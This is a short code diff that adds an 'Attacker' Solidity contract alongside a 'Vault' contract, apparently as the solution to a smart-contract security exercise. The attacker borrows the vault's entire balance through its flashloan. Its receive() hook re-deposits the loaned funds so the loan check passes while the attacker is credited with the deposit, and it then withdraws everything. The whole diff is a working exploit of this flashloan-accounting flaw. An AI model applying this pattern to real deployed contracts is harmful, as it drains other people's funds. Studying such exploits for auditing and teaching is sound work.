@@ -26,3 +26,27 @@ contract Vault {
         require(finalBalance >= initialBalance, "Final balance lower than Initial balance");
     }
 }
+
+contract Attacker {
+    Vault vault;
+    bool widthrawing = false;
+
+    constructor(address vaultAddress) {
+        vault = Vault(vaultAddress);
+    }
+
+    function attack() external payable {
+        vault.flashloan(address(vault).balance);
+    }
+
+    function withdraw() external {
+        widthrawing = true;
+        vault.withdraw();
+    }
+
+    receive() external payable {
+        if(!widthrawing) {
+            vault.deposit{value: address(this).balance}();
+        }
+    }
+}
